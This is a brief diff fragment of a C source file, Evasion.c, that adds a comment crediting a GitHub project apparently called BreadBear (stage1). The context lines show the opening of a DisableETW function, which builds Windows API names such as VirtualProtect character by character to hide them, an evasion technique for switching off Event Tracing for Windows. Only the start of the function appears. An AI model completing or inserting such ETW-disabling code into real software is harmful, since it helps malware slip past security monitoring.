@@ -1,5 +1,7 @@
 #include "Evasion.h"
 
+// https://github.com/Allevon412/BreadBear/blob/4f1f5da39b423f0655df9338e01c8b733c6d1152/stage1/Evasion.c
+
 int DisableETW(void) {
 	unsigned char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0x0 };
 	unsigned char strFlushInstructionCache[] = { 'F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0x0 };
